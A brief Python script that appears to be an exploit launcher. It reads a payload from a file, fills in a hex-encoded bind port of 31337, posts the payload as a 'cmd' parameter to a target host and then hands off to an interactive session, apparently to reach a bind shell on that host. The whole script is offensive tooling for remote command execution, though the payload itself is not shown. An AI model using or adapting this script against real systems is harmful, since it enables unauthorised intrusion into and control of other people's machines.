#!/usr/bin/env python

import argparse
import srequests
import utils

parser = argparse.ArgumentParser()

parser.add_argument("host")
parser.add_argument("exploit")

args = parser.parse_args()

bind_port = 31337

cmd = open(args.exploit, 'r').read() % (utils.port2hex(str(bind_port)))

data    = { "cmd": cmd }
headers = {}
cookies = {}

s = srequests.post(args.host, data=data)
utils.interact(s)
